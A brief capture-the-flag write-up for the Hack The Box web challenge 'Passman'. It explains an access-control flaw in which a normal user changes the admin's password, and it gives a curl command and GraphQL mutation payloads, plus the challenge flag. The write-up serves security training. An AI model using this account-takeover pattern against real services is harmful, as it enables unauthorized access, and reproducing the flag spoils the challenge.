# Web 04 - Passman

The solution is to log inside the app as normal user and change the password for the admin.

There are no checks in the code about it, so it is possible.

curl command for testing

```
curl -H "Content-Type: application/json" --request POST --data '<payload>' http://167.172.50.208:32288/graphql
```

```
HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}
```

### graphql request format

Login

```
{"query":"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }","variables":{"username":"test","password":"test"}}
```

AddPhrase

```
{"query":"mutation($recType: String!, $recAddr: String!, $recUser: String!, $recPass: String!, $recNote: String!) { AddPhrase(recType: $recType, recAddr: $recAddr, recUser: $recUser, recPass: $recPass, recNote: $recNote) { message } }","variables":{"recType":"Web","recAddr":"a","recUser":"a","recPass":"a","recNote":"a"}}
```

UpdatePassword (like Login)

```
{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }","variables":{"username":"test","password":"test"}}
```
